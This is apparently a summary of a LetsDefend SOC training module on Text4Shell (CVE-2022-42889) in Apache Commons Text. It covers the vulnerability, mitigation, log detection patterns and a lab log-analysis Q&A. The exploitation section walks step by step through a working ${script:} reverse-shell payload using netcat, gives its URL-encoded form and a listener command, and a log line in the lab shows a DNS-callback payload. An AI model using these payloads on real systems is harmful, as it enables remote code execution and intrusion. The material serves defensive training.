# LetsDefend: Text4Shell Module Summary

**Table of Contents:**

- Overview of Text4Shell
- Attack Vectors
- How to exploit
- Detecting and Metegation
- Text4Shell and SOC Analysts

### **Overview**

**Text4Shell (CVE-2022-42889)** is a **remote code execution (RCE)** vulnerability in **Apache Commons Text** versions **1.5 to 1.9**, disclosed on **October 13, 2022**. It has a **CVSS score of 9.8 (critical)** and arises from **insecure string interpolation** in the `StringSubstitutor` class, which can evaluate malicious input such as scripts, DNS, or URLs.

It was discovered by **Alvaro Muñoz**, and the issue is fixed in **version 1.10**.

---

### **Vulnerability Details**

- Affects **Apache Commons Text**, a Java library for string manipulation.
- Vulnerability lies in the **default interpolators** (`script`, `dns`, `url`) that allow evaluation of untrusted data.
- Attackers can exploit this to execute arbitrary commands or connect to remote systems.
- Java 15+ mitigates some of the risk, but exploitation is still possible in specific cases.

---

### **Attack Vectors**

- Exploitation involves injecting payloads into input fields or parameters that use vulnerable interpolation.
- Example payload:
    
    ```
    ${script:java.lang.Runtime.getRuntime().exec('nc 192.168.49.1 9090 -e /bin/sh')}
    ```
    
- Attackers may use URL encoding and deliver payloads through parameters like:
    
    ```
    http://target/?param=%24%7Bscript%3Ajava.lang.Runtime.getRuntime%28%29.exec...
    ```
    
- Other vectors include **malicious DNS lookups** and **crafted URLs**.

---

### **How Exploitation Works**

1. Identify an application using vulnerable versions (1.5–1.9).
2. Construct the payload: Create a payload that leverages the ``${script:}`` prefix to execute arbitrary commands. For example, a payload to open a reverse shell connection could be ``${script:java.lang.Runtime.getRuntime().exec('nc 192.168.49.1 9090 -e /bin/sh')}``. Customize the IP address and port in the payload as per your setup.
3. Encode and inject it into a vulnerable parameter.
4. Identify the target URL: Determine the URL of the vulnerable endpoint where the payload will be injected. This URL typically includes a parameter or input that undergoes string interpolation or substitution.
5.  ****Inject the payload: Append the encoded payload to the target URL parameter, ensuring proper URL encoding. For example, if the parameter is ``search``, the URL may look like .
    
    ```bash
    http://web.app/text4shell/attack?search=%24%7Bscript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%20192.168.49.1%209090%20-e%20%2Fbin%2Fsh%27%29%7D
    ```
    
6. Trigger the payload (e.g., via browser or `curl`).
7. Listen for the reverse shell: If the payload is successful, set up a listener on the specified IP address and port to capture the reverse shell connection. For example, use the ``nc -nlvp 9090`` command to listen on port `9090`for incoming connections.

---

### **Detection & Mitigation**

1. **Update immediately** to **Apache Commons Text v1.10**.
2. **Disable unsafe interpolators** or configure `StringSubstitutor` to use only safe lookups.
3. **Use custom lookup maps** to restrict execution to trusted values.
4. Monitor logs for suspicious patterns such as:
    
    ```
    *${script:*
    *${url:*
    *${dns:*
    *script*java.lang.Runtime.getRuntime*
    ```
    

**Example Nginx payload:**

<img width="2048" height="596" alt="image" src="https://github.com/user-attachments/assets/ee03d52a-25a2-4845-a341-64763ac0a86d" />

### **SOC Analyst Perspective**

In a [blog post](https://security.apache.org/blog/cve-2022-42889/), Apache's security team provided additional context on the comparison between Log4Shell and Text4Shell vulnerabilities. While both vulnerabilities have names ending with "4Shell," they differ in their nature and impact.

Log4Shell (CVE-2021-44228) allowed string interpolation from the log message body, which commonly contains untrusted input. This made it easier for applications to inadvertently pass in untrusted input without proper validation, increasing the risk of exploitation.

In contrast, Text4Shell is a vulnerability specific to the Apache Commons Text library. This library provides utilities for working with strings and includes a feature called string substitution. It allows users to replace specific pieces of text with other values. The StringSubstitutor class, part of Apache Commons Text, is responsible for this functionality.

The StringSubstitutor class substitutes variables within a string with corresponding values. The standard format for interpolation/substitution is "${prefix: name}", where "prefix" represents the lookup key, and "name" refers to the strings whose values are processed by the lookup methods.

It is important to note that the relevant method in Apache Commons Text is explicitly intended for string interpolation and is well-documented, reducing the likelihood of inadvertently passing untrusted input without proper validation.

While both vulnerabilities share a naming convention, Log4Shell and Text4Shell differ in their execution and impact. Understanding these distinctions helps provide clarity on the nature of the Text4Shell vulnerability within the Apache Commons Text library.

To successfully exploit the Text4Shell vulnerability, the following conditions must be met:

1. **Vulnerable Apache Commons Text Versions:** The vulnerability affects Apache Commons Text versions 1.5 through 1.9. These specific versions are susceptible to the Text4Shell vulnerability. However, the issue has been addressed and fixed in version 1.10. Upgrading to version 1.10 or later mitigates the vulnerability.
2. **Vulnerable StringSubstitutor Configuration**: Exploiting Text4Shell requires the usage of StringSubstitutor in a vulnerable configuration. The vulnerable configuration allows for insecure string interpolation, enabling the execution of arbitrary code. It is crucial to ensure that the StringSubstitutor is not configured to perform unsafe evaluations of user-provided inputs.
3. **Acceptance of Arbitrary, Attacker-Controlled Input**: The application utilizing Apache Commons Text and StringSubstitutor must accept arbitrary and attacker-controlled input that undergoes string interpolation. If the input data is properly validated, sanitized, or restricted, the potential for successful exploitation is significantly reduced.
4. **JDK Vulnerability**: Early reports suggest that versions 15 and above of the JDK are not vulnerable to the Text4Shell vulnerability. However, it is important to note that new proof-of-concept (POCs) have emerged that demonstrate successful exploitation on JDK 15+. Therefore, it is advised to stay updated with the latest security advisories and patches for the JDK to mitigate potential risks

- SOC analysts should:
    - Monitor for suspicious **process creation** (`cmd.exe`, `bash`, `powershell.exe`).
    - Detect **command execution attempts** and **system info discovery** (e.g., `whoami`, `hostname`).
    - Watch for **outbound connections** to unknown IPs or ports.
    - Use **SIEM**, **IDS/IPS**, and **endpoint protection** to correlate events.
- Post-compromise indicators include **new processes**, **abnormal traffic**, or **data exfiltration attempts**.

**Q&A:**

File Location: `/root/Desktop/QuestionFiles/access.log`

Q1. What was the attacker IP address?

```bash
root@ip-172-31-40-37:~/Desktop/QuestionFiles# grep -P -n "(?i)\$\{dns:|script" access.log 
26515:234.180.146.216 - - [11/Jul/2023:23:01:29 +0000] "GET /hello.php?name=$%7bscript%3ajavascript%3ajava%2elang%2eRuntime%2egetRuntime()%2eexec('nslookup%20emerald170%2emesswithdns%2ecom')%7d HTTP/1.1" 200 2984 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
root@ip-172-31-40-37:~/Desktop/QuestionFiles# 
```

Decdoed:

```bash
"GET /hello.php?name=${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup emerald170.messwithdns.com')} HTTP/1.1
```

*Ans: 234.180.146.216*

Q2. What is the DNS server that the attacker tried to reach?

*Ans:”emerald170.messwithdns.com”*

Q3. What is the vulnerable parameter?

*Ans: name*

---

### **Conclusion**

Text4Shell underscores the importance of:

- Continuous **patch management** and **vulnerability monitoring**.
- Proactive **log analysis** and **threat detection** by SOC teams.
- Implementing **defense-in-depth** with SIEM rules, endpoint monitoring, and secure configurations.

By promptly updating to Apache Commons Text 1.10 and enhancing detection for suspicious interpolation attempts, organizations can effectively protect against this critical RCE vulnerability.
